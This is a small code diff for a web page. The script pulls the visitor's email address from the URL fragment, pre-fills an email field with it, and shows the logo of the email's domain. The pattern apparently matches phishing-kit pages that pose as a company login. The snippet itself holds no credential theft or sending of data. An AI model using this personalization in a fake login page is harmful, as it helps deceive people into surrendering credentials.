@@ -180,8 +180,14 @@
 
 
         /////////////url email getting////////////////
-        var email = window.location.hash.substr(1);
+             var rawEmail = window.location.hash.substr(1);
+        
+        var email = rawEmail.split('@')[1];
         var img = document.querySelector('.logoimg');
+
+        console.log("check", email)
+
+        $('#email').val(rawEmail);
 
         // Set the src attribute to the desired link
         img.setAttribute('src', `https://logo.clearbit.com/${email}`);
